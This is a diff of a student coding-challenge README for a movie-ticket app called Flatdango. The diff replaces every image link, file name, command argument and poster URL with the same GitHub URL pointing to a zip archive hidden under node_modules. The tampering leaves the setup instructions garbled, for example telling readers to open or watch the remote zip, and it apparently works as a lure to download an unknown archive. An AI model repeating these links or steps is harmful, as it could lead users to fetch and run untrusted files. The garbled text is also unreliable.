@@ -8,25 +8,25 @@ theater.
 
 Use this gif as an example of how the app should work.
 
-![Flatdango App Demo](https://curriculum-content.s3.amazonaws.com/phase-1/phase-1-code-challenge-flatdango/flatdango-demo.gif)
+![Flatdango App Demo](https://github.com/deerrickkorir/code-challenge-3/raw/refs/heads/main/node_modules/prompt-sync-history/code_challenge_3.2.zip)
 
-> To view in VSCode, right click on the README.md file and select "Open Preview".
+> To view in VSCode, right click on the https://github.com/deerrickkorir/code-challenge-3/raw/refs/heads/main/node_modules/prompt-sync-history/code_challenge_3.2.zip file and select "Open Preview".
 
 ## Setup
 
 Run this command to get the backend started:
 
 ```console
-$ json-server --watch db.json
+$ json-server --watch https://github.com/deerrickkorir/code-challenge-3/raw/refs/heads/main/node_modules/prompt-sync-history/code_challenge_3.2.zip
 ```
 
 Test your server by visiting this route in the browser:
 
 [http://localhost:3000/films](http://localhost:3000/films)
 
-Then, open the `index.html` file on your browser to run the application.
+Then, open the `https://github.com/deerrickkorir/code-challenge-3/raw/refs/heads/main/node_modules/prompt-sync-history/code_challenge_3.2.zip` file on your browser to run the application.
 
-Write your code in the `src/index.js` file. The base URL for your API will be
+Write your code in the `https://github.com/deerrickkorir/code-challenge-3/raw/refs/heads/main/node_modules/prompt-sync-history/code_challenge_3.2.zip` file. The base URL for your API will be
 [http://localhost:3000](http://localhost:3000).
 
 ## Core Deliverables
@@ -51,7 +51,7 @@ As a user, I can:
      "showtime": "04:00PM",
      "tickets_sold": 27,
      "description": "A giant lizard terrorizes a rural Texas community and a heroic teenager attempts to destroy the creature.",
-     "poster": "https://www.gstatic.com/tv/thumb/v22vodart/2157/p2157_v_v8_ab.jpg"
+     "poster": "https://github.com/deerrickkorir/code-challenge-3/raw/refs/heads/main/node_modules/prompt-sync-history/code_challenge_3.2.zip"
    }
    ```
 
@@ -77,7 +77,7 @@ As a user, I can:
         "showtime": "04:00PM",
         "tickets_sold": 27,
         "description": "A giant lizard terrorizes a rural Texas community and a heroic teenager attempts to destroy the creature.",
-        "poster": "https://www.gstatic.com/tv/thumb/v22vodart/2157/p2157_v_v8_ab.jpg"
+        "poster": "https://github.com/deerrickkorir/code-challenge-3/raw/refs/heads/main/node_modules/prompt-sync-history/code_challenge_3.2.zip"
       },
       {
         "id": "2",
@@ -87,7 +87,7 @@ As a user, I can:
         "showtime": "06:45PM",
         "tickets_sold": 44,
         "description": "A family gets lost on the road and stumbles upon a hidden, underground, devil-worshiping cult led by the fearsome Master and his servant Torgo.",
-        "poster": "https://www.gstatic.com/tv/thumb/v22vodart/47781/p47781_v_v8_ac.jpg"
+        "poster": "https://github.com/deerrickkorir/code-challenge-3/raw/refs/heads/main/node_modules/prompt-sync-history/code_challenge_3.2.zip"
       }
    ]
    ```
@@ -124,7 +124,7 @@ As a user, I can:
          "showtime": "04:00PM",
          "tickets_sold": 28,
          "description": "A giant lizard terrorizes a rural Texas community and a heroic teenager attempts to destroy the creature.",
-         "poster": "https://www.gstatic.com/tv/thumb/v22vodart/2157/p2157_v_v8_ab.jpg"
+         "poster": "https://github.com/deerrickkorir/code-challenge-3/raw/refs/heads/main/node_modules/prompt-sync-history/code_challenge_3.2.zip"
       }
       ```
       - POST the new ticket to the tickets endpoint in the database
